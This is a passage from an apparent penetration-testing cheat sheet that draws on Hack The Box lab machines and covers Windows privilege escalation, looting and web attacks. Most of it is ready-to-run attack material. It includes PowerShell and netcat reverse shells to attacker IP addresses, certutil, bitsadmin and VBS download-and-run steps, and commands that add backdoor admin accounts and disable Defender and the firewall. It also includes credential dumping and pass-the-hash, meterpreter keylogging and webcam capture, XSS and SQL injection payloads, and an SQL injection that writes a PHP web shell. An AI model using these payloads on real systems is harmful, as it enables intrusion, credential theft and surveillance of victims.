6) nc -lnvp 9444 (Set a listener in attacker machine)

7) Run "sysinfo" in victim box

8) Got root

Reference: magic box (htb)

```




## Windows

Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.

- Kernel exploits
- Cleartext password
- Reconfigure service parameters
- Inside service
- Program running as root
- Installed software
- Scheduled tasks
- Weak passwords

### Basic info

```
systeminfo
set
hostname
net users
net user user1
net localgroups
accesschk.exe -uwcqv "Authenticated Users" *

netsh firewall show state
netsh firewall show config

# Set path
set PATH=%PATH%;C:\xampp\php

whoami /priv

dir/a -> Show hidden & unhidden files
dir /Q -> Show permissions
```

### Kernel exploits


```
# Look for hotfixes
systeminfo

wmic qfe get Caption,Description,HotFixID,InstalledOn

# Search for exploits
site:exploit-db.com windows XX XX
```

### Cleartext passwords

```
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Reconfigure service parameters

- Unquoted service paths

- Weak service permissions

https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

### Dump process for passwords

```powershell
# Looking for Firefox
Get-Process
./procdump64.exe -ma $PID-FF
Select-String -Path .\*.dmp -Pattern 'password' > 1.txt
type 1.txt | findstr /s /i "admin"
```

### Inside service

Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.

```
# Meterpreter
run get_local_subnets

netstat /a
netstat -ano
```

### Programs running as root/system

### Installed software

```
# Metasploit
ps

tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

Look in:
C:\Program files
C:\Program files (x86)
Home directory of the user
```

### Scheduled tasks

```
schtasks /query /fo LIST /v

Check this file:
c:\WINDOWS\SchedLgU.Txt
```

### Weak passwords

Remote desktop

```
ncrack -vv --user george -P /root/oscp/passwords.txt rdp://10.11.1.111
```

### Add user and enable RDP

```
# Add new user

net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD

# Turn firewall off and enable RDP

sc stop WinDefend
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

### Powershell sudo for Windows

#### Powershell Method 1

```
$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force
$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw
$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'

powershell -ExecutionPolicy Bypass -File xyz.ps1
```

#### Powershell Method 2

We can change from USER_01 to another USER_02 knowing the "username" and "password" of the second.

Use with SMB Server:

```
$username = '10.10.10.167\hector'
$password = 'l33th4x0rhector'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-Command -ScriptBlock {\10.10.14.41\share\nc.exe 10.10.14.41 1234 -e c:\windows\system32\cmd.exe} -Credential $credential -computer localhost

Invoke-Command -ScriptBlock {whoami} -Credential $credential -computer localhost
```

Use with WGET command:

```
$username = '10.10.10.167\hector'
$password = 'l33th4x0rhector'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-Command -ScriptBlock {wget http://10.10.14.41:1234/nc.exe -O C:\windows\system32\spool\drivers\color\nc.exe} -Credential $credential -computer localhost
Invoke-Command -ScriptBlock {C:\windows\system32\spool\drivers\color\nc.exe 10.10.14.41 444 -e C:\windows\system32\cmd.exe} -Credential $credential -computer localhost
```

### Windows download with bitsadmin

```
bitsadmin /transfer mydownloadjob /download /priority normal http://<attacker10.11.1.111>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
```

### Windows download with certutil.exe

```
certutil.exe -urlcache -split -f "http://10.11.1.111/Powerless.bat" Powerless.bat
```

### Windows download with powershell

````
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.1.111/file.exe','C:\Users\user\Desktop\file.exe')"

(New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")
````

### Windows Download from FTP

```
# In reverse shell
echo open 10.11.1.111 > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt 
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -v -n -s:ftp.txt
```

### Windows create SMB Server transfer files

```bash
# Attack machine
python /usr/share/doc/python-impacket/examples/smbserver.py Lab "/root/labs/public/10.11.1.111"

	# Or SMB service 
	# http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
	vim /etc/samba/smb.conf
		[global]
		workgroup = WORKGROUP
		server string = Samba Server %v
		netbios name = indishell-lab
		security = user
		map to guest = bad user
		name resolve order = bcast host
		dns proxy = no
		bind interfaces only = yes
	
		[ica]
		path = /var/www/html/pub
		writable = no
		guest ok = yes
		guest only = yes
		read only = yes
		directory mode = 0555
		force user = nobody

	chmod -R 777 smb_path
	chown -R nobody:nobody smb_path
	service smbd restart 

# Victim machine with reverse shell
Download: copy \\10.11.1.111\Lab\wce.exe . 
Upload: copy wtf.jpg \\10.11.1.111\Lab

```

### Windows download with VBS

````
# In reverse shell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# Execute
cscript wget.vbs http://10.11.1.111/file.exe file.exe
````

### Windowss XP SP1 PrivEsc

```bash
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.1.111 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```

### Pass The Hash

```
# Login as user only with hashdump
# From this hashdump
# admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::

msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target address range or CIDR identifier
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCR10.11.1.111TION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(windows/smb/psexec) > set rhosts 10.10.0.100
rhosts => 10.10.0.100

msf5 exploit(windows/smb/psexec) > set smbuser admin2

smbuser => admin2

msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7

smbpass => aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7

msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp

payload => windows/x64/meterpreter/reverse_tcp

```

### Scripts

#### Useradd

````
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user <username> <password> /add && net localgroup administrators <username> /add");
  return 0;
}

# Compile
i686-w64-mingw32-gcc -o useradd.exe useradd.c
````

#### Powershell Run As

```powershell
echo $username = '<username>' > runas.ps1
echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
```

#### Powershell Reverse Shell

```powershell
Set-ExecutionPolicy Bypass

$client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Powershell Non-interactive Execute Powershell File
```powershell
# Powershell (Non-interactive execute powershell file) 
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
```

### Windows privesc/enum tools

- [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
- [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
- [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)
- [Watson](https://github.com/rasta-mouse/Watson)
```
Compile WATSON (with VisualStudio e.g.) and run it against vicim machine.
```
### Windows precompiled exploits

- [WindowsExploits](https://github.com/abatchy17/WindowsExploits)

### Windows Port Forwarding

Run in victim (5985 WinRM):

`plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221`

### Windows DnsAdmins and Explotation of DLL

```
# Run this

whoami /groups

# If you see like some this:

Group Name		Type
DOMAIN\DnsAdmins	Alias

# Then this is VULNERABLE. (See "Control" box from HTB for referencies)
 ```
 
 ### See Users and Objects Eliminated From AD
 
 If you have a User with permissions for this operation, you can see USERS and OBJECTS eliminated from AD (Active Directory):
 
 ```
 Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $True' -Property *
 ```

### Dump Passwords Hashes from Active Directory

```
# Dump hashes (domain-controller or ip of victim)

python secretsdump.py -dc-ip <ip> <domain/user@domain_controller>

# Run wmiexec.py with the HASH located

python wmiexec.py -hashes '<hashUser> '<User>@<ip>'

Resource: https://medium.com/@airman604/dumping-active-directory-password-hashes-deb9468d1633
```

### Azure AD
```
- Azure ActiveDirectory presents many ways for get privilege escalation

# If you run

whoami /all

# And see that your user is Azure Admin

Group Name                                  Type             SID                                          Attributes 
=========================================== ================ ============================================ ==================================================
<DOMAIN>\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group

# You can try dump credentials with "AzureAD Connect.ps1"

1) Download the module to own machine:

- wget https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1

2) Download the module in the victim machine:

- python -m SimpleHTTPServer 1234 (attacker machine)
- powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.7:1234/Azure-ADConnect.ps1','C:\Users\mhope\Desktop\azure.ps1')" (victim machine)

3) Export this module

- import-module ./<your_module.ps1>
- import-module ./Azure-ADConnect.ps1   

4) Run the command for extract credentials

- <your_module> -server <ip_victim> -db <db_name>      
- Azure-ADConnect -server 127.0.0.1 -db ADSync      


Reference:
- monteverde box (htb)
- https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1
- https://github.com/DeanCefola/PowerShell-Scripts/blob/master/Azure%20AD/AzureAD%20Connect.ps1


# More info about privilege escalation with AZURE: 
- https://blog.xpnsec.com/azuread-connect-for-redteam/
- https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a
```





# **Loot**

## Linux

**Checklist**

- Proof:
- Network secret:
- Passwords and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:
- Mail:

### Proof
```
echo -e '\n'HOSTNAME:   && hostname && echo -e '\n'WHOAMI:   && whoami && echo -e '\n'PROOF:  && cat proof.txt && echo -e '\n'IFCONFIG:  && /sbin/ifconfig && echo -e '\n'PASSWD:  && cat /etc/passwd && echo -e '\n'SHADOW:  && cat /etc/shadow && echo -e '\n'NETSTAT:  && netstat -antup
```


### Network secret

```
/root/network-secret.txt
```

### Passwords and hashes

```
cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

john <file_cracked> --show
```

### Dualhomed

```
ifconfig
ifconfig -a
arp -a
```

### Tcpdump

```
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
use auxiliary/sniffer/psnuffle

.ssh:
.bash_history
```

### Databases

### SSH-Keys

### Browser

### Mail

```
/var/mail
/var/spool/mail
```

### GUI

If there is a gui we want to check out the browser.

```
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```

### ShellShock

If you find a "cgi-bin" and some file executable, you should be test this:

```
curl -H "User-Agent: () { :; }; echo; /usr/bin/whoami" http://10.10.10.56/cgi-bin/user.sh

Tips:
. Sometimes it is necessary to use double or triple "echo".
. Sometimes it is necessary to put the absolute path of the command that is invoked
```

### Grep

When you want run more than seach of string, you can run "egrep" like:

```
egrep -i ‘(string1|string2|...|stringN)’ [FILE_NAME]
```

## Windows

### Proof
```
hostname && whoami.exe && type proof.txt && ipconfig /all
```

### Passwords and hashes

```
wce32.exe -w
wce64.exe -w
fgdump.exe

# Loot passwords without tools
reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
```

### Dualhomed

```
ipconfig /all
route print

# What other machines have been connected
arp -a
```

### Tcpdump

```
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
hashdump
keysscan_start
keyscan_dump
keyscan_stop
webcam_snap

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```

### VNC Crack Server Encrypted Password

```
# We can find a file called "VNC Install.reg" maybe. We can crack this with the next tool:

vncpwd.exe [PASSWORD_FOR_CRACK]

https://www.raymond.cc/blog/crack-or-decrypt-vnc-server-encrypted-password/

# (LINUX) VNC Passwords in a file are stored obfuscated, but they can be broken. Use this one, running the python and using -d for decrypt, and -f secret to point it at our file

python /opt/vncpasswd.py/vncpasswd.py -d -f <file_encrypted>

https://github.com/trinitronx/vncpasswd.py
```

### Decompile Binaries
```
# We can decompile binaries files with dnSpy:

https://github.com/0xd4d/dnSpy/
```

# **Data Bases Tips**

## SQLite3
```
# We can open a file "SQLite 3.x database" with:

sqlite3 [file.db]

# List the DB:

.databases

# Open a DB:

.open [Path_Of_DB]

# See Tables:

.tables

# Select All of an Object:

select * from [TABLE];
```

## MySQL Dump
```
# If you have credentials for MySQL DB, you can try dump information

mysqldump -A -u <dbUsername> --password=<dbPassword> -X
```

# **Web**

## Test SSL

```
testssl (https://testssl.sh/)
```

## HTML Parameter Pollution (HPP)
```
# In the event that the request contains multiple values for the parameter in question, you can give three possibilities:

1. That the method returns the first value of the parameter
2. To return the last
3. Or to return a combination of all values.

https://www.elladodelmal.com/2011/03/hpp-http-parameter-pollution.html

--- Server-Side HPP ---

# An attacker could try to add another "from" parameter to trick the server, and in that case, this parameter would transact from one account to another that is not owned by the attacker.

# OK:
https://example.com/transfer?from=1377&to=1234&amount=5000

# EXPLOITED:
https://example.com/transfer?from=1377&to=1234&amount=5000&from=1338


--- Client-Side ---

# An attacker could add other "candidate" param and send this to the victim. When the victim open the URL, it won't matter what your vote, this will be always "green" vote.

# OK:
http://example.com/votation?candidate=green&vote=1

# EXPLOITED:
http://example.com/votation?candidate=green&vote=1%26candidate=black
```

## Fuzzing Directories
```
gobuster dir -u [URL] -w [WORDLIST] -t [THREADS]
wfuzz -c --hc=403,404 -t 500 -w [WORDLIST] -w extensions.txt http://10.10.10.56/FUZZ.FUZ2Z
dirsearch.py -u <URL> -w <WORDLIST> -f -e <extensions>
```

## HTML Injection
```
# Payloads:

<html>test</html>
<htm>test</htm>
<h1>test</h1>
<h1><a href ="http://example.com/">TEST</a></h1>
</br><h1>TEST</h1><img src="http://bing.com/"></br><h1>Test2</h1></br>
<math><maction actiontype="statusline#http://bing.com" xlink:href="javascript:alert(9)">CLICKME</maction></math>
"/><h1>holis</h1>
```

## XSS
```
# Payloads:

"><sVg/onload=confirm(8)>
"><img/src=x onerror=confirm(8)>

"><iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">

\u0022><iframe\u002Fsrc\u003D\u0022data:text\u002Fhtml;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg\u003D\u003D\u0022>

\u0022><iframe/src="https://www.example.com/" style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(8)">

<iframe src="https://isecauditors.com/,javascript:alert(1)//">

<</div>script</div>>alert()<</div>/script</div>>
<</div>script</div>>prompt(8)<</div>/script</div>>

"><video controls onloadstart="alert(8)"><source src=x></video>

" onmouseover=alert(9205) bad="

# More payloads in <payloads.txt>


# Set "Referer: batman" header and check if it is reflected
...
Host: example
Referer: batman
...

# Set "Host" with:

Host: www.bing.com"><script>alert(document.domain)</script><"

# Set payload in:

http://example.com/path/about/xss/<payload>

# Encode with UNICODE and URL

https://www.branah.com/unicode-converter
```


## CORS
```
# Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP)

# Add header "Origin" and see if this reflected in the response

Origin: http://bing.com/
Origin: http://bing.com
Origin: bing.com/
Origin: bing.com
Origin: null

# If you find in the response

"Access-control-allow-origin: bing.com | * | null", then domain is vulnerable

# Testing

curl <domain> -H "Origin: <https://bing.com>" -I

--- Exist 3 cases for exploit this, 2 are good and 1 is a missconfiguration ---

1) Best case for attack:
	Access-Control-Allow-Origin: <evildomain.com>
	Access-Control-Allow-Credentials: true
	
2) Exploitable:
	Access-Control-Allow-Origin: null
	Access-Control-Allow-Credentials: true
	
3) Missconfiguration: (this is not exploitable, only missconfiguration)
	Access-Control-Allow-Origin: *
	Access-Control-Allow-Credentials: true
	
# PoC:

<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract SID</h3>
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
document.getElementById("demo").innerHTML = alert(this.responseText);
}
};
xhttp.open("GET",”<https://endPoint/>”, true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>

# Tool

Use "Corsy" (https://github.com/s0md3v/Corsy)
```


## Scanners
```
# Run scanners like:

. Burpsuite
. Nikto
```


## Business Logic
```
#Find vulnerability associated with business logic.
```

## Change Methods HTTP
```
OPTION
POST
GET
PUT
HELP
TRACE
```


## PHP Type Juggling
```
# If we find PHP logins it is probable that the "strcmp" function is used, which is vulnerable at the code level:

curl -X POST [URL] --data 'username=test&password[]=test2'
```

## Host Header Injection
```
# First method for testing

Change the actual host to "bing.com"

# Second method for testing

Change real host to "bing.com" and set the header "X-Forwarded-Host: [webReal]"

# Third method for testing

Set header "X-Forwarded-Host: bing.com" and the host with the real host

# Quarter method

Set header "Referer: https://www.bing.com/"
```

## Adobe AEM Flush Cache Dispatcher
```
# Unauthorized attackers can invalidate/flush dispatcher cache remotely without any rate limiting. If this is done repeatedly it can severely impact the site performance.

curl -H "CQ-Handle: /content" -H "CQ-Path: /content" https://[WEB_FOR_TESTING]/dispatcher/invalidate.cache

Reference: https://twitter.com/AEMSecurity/status/1244965623689609217
```


## Open Redirection
```
# Testing with BurpSuite

3XX requests look up for interesting redirection

# Fast test

http://example.com//bing.com
http://example.com//www.bing.com
http://example.com//bing.com/%2e%2e

# Add "http://example.com/test" and with Intruder + <payloads.txt> test the OpenRedirection

<payloads.txt>
```

## Parameter Tampering
```
# Modify parameters against bussiness logic

Modify a request JSON with "amount=<modify>" instead "amount=<real_amount>"
```

## File Inclusion
```
--- Local File Inclusion ---

http://example.com/index.php?referee=login.php

# If target web server is reside on Linux platform, server path will be:

/var/www/html/trump.jpeg 
http://example.com/index.php?file=trump.jpeg
http://example.com/index.php?file=../../../etc/passwd

# If target web server is reside on Windows platform, you can try:

http://example.com/index.php?file=C:\boot.ini 

http://example.com/index.php?file=../../C:\boot.ini


Tool: https://github.com/D35m0nd142/LFISuite (For all test and interactive revShell if it's possible)


--- Log Poisoning (RCE & LFI) ---

- If you have a file inclusion vulnerability you can try this technique:

# Search the directory for see the logs of server

http://10.10.10.84/browse.php?file=/var/log/httpd-access.log

- Possible Directories for HTTP Requests:

/var/log/httpd-access.log
https://unix.stackexchange.com/questions/38978/where-are-apache-file-access-logs-stored
https://phoenixnap.com/kb/apache-access-log

# Inject your PHP Shell in the "User-Agent

1) From "root" directory of web (http://10.10.10.84/) with GET request we modify the User-Agent

	GET / HTTP/1.1
	Host: 10.10.10.84
	User-Agent: <?php system($_GET['c']); ?>
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Connection: close
	Upgrade-Insecure-Requests: 1

2) See the log file again and notice a error is displayed

http://10.10.10.84/browse.php?file=/var/log/httpd-access.log

"<b>Warning</b>:  system(): Cannot execute a blank command in <b>/var/log/httpd-access.log</b> on line <b>13</b><br />"


3) Use your variable "c" for execution of command

http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=whoami

"10.10.14.40 - - [02/May/2020:04:06:48 +0200] "GET / HTTP/1.1" 200 289 "-" "www"

4) Get a revShell. Encoding the revShell with URL encode

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.40 1234 >/tmp/f
%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%34%30%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66

http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%34%30%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66

Reference: poison box (htb)


--- Remote File Inclusion ---

http://example.com/?share=http://facebook.com/status?id=12672

# Try:

http://example.com/index.php?file=http://remoteweb.com/trump.jpg 

http://example.com/index.php?file=http://malacious.com/malacious.php
```


## Missing Insufficient SPF Record
```
# Check if SPF record is missconfigured

https://www.kitterman.com/spf/validate.html
https://mxtoolbox.com/

# Create fake mail

https://emkei.cz/
```


## External Service Interaction DNS
```
# Header "X-Forwarded-For"

Host: whitedomain.com
X-Forwarded-For: <yourserver>

# Method HTTP

GET <http://yourserver>
CONNECT <http://yourserver>
```

## SSRF
```
# You have to find any parameter that may have some kind of external interaction or they can interact to external domain

http://example.com/index/php?uri=http://external.com

# Possible related parameter to hunt for SSRF

dest
path
window
reference
val
callback
view
redirect
continue
next
site
validate
return
dir
uri
url
data
html
domain
page
show
file
root
pdf
doc
port
navigation
feed
document
folder
path
pg
style
template
php_path
feed
host
to
out
open
result

--- 1º Method ---
# Read file from server

http://example.com/showimage.php?file=file:///<payloads>

--- 2º Method ---
# Scan the internal network

http://example.com/showimage.php?file=http://localhost:<port>

--- 3º Method ---
# SSRF with RFI (Create a web page HTML with a "alert(1)" in your hosting)

http://example.com/showimage.php?file=http://myhost/pagewithxss.html
```


## Critical File and Source Code Disclosure
```
# Testing with BurpSuite from Critical File and Source Code

http://example.com/<paramToFuzz>

Use the dictionary appropriate.
```

## CSRF
```
# Test this with BurpSuite
```


## SQL Injection
```
====================
=== Header Based ===
====================

# Classic

Look in "Host", "User-Agent", "Referer", "Location" and insert:
->  \
->  '
->  "

Example:

User-Agent: <user-agent>\

# Based Time

<Host|User-Agent|Referer|Location>: <valueOfHeader>' OR SLEEP(8) AND 'a'='a


====================
=== Cookie Based ===
====================

# Classic

Look in "Cookie" and insert:

->  \
->  '
->  "

Example:

Cookie: <cookie>=<value>\

=============================
=== Bypass Authentication ===
=============================

# Login

' OR 1=1 --
' OR 2=2 --
") OR 1=1 --
') OR 1=1 --
admin==
admin'-
'or''='
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -

=============================
=== SQL Injection Classic ===
=============================

--- MySQL ---

# When you have a Classic SQLi, test "Time Based" and exploit it with "union select" to know the total of columns.

NOTE: Asign a error value (cod=-0)

http://10.10.10.143/room.php?cod=-0+union+select+1,2,3,4,5,6,7--

### Manual Exploitation ### 

# Version

http://10.10.10.143/room.php?cod=0+union+select+1,2,version(),4,5,6,7--

# DB username

http://10.10.10.143/room.php?cod=-1+union+select+1,2,user(),4,5,6,7--

# DB name

http://10.10.10.143/room.php?cod=0+union+select+1,2,database(),4,5,6,7--

# See ALL DBs

1) First Method

http://10.10.10.143/room.php?cod=0+union+select+1,2,(select+group_concat(schema_name,":")+from+information_schema.schemata),4,5,6,7--

2) Second Method

http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit 0,1--
http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit 1,1--
http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit 2,1--
http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit 3,1--
...
...
...
http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit <n>,1--

# Tables of current DB

http://10.10.10.143/room.php?cod=0+union+select+1,2,(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),4,5,6,7--

# See ALL Tables of a DB

http://10.10.10.143/room.php?cod=-1+union+select+1,2,(SELECT+group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n")+from+Information_Schema.COLUMNS+where+TABLE_SCHEMA+=+'<DB_NAME>'),4,5,6,7--


# List Password Hashes (from MySQL DB)

http://10.10.10.143/room.php?cod=-1+union+select+1,2,(SELECT+group_concat(host,":",user,":",password,"\r\n")+from+mysql.user),4,5,6,7--


# Read files from DB (Load File)

http://10.10.10.143/room.php?cod=0+union+select+1,2,load_file('/etc/passwd'),4,5,6,7--


http://10.10.10.143/room.php?cod=0+union+select+1,2,(TO_base64(LOAD_FILE("/var/www/html/<file.php>"))),4,5,6,7-- (in base64)


# Upload php command injection file

union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'


--- SQLMap ---

# Testing a parameter with GET (mark with a "*" the parameter to test)

sqlmap.py -u "http://example.com/main.php?id=1*" --batch --banner
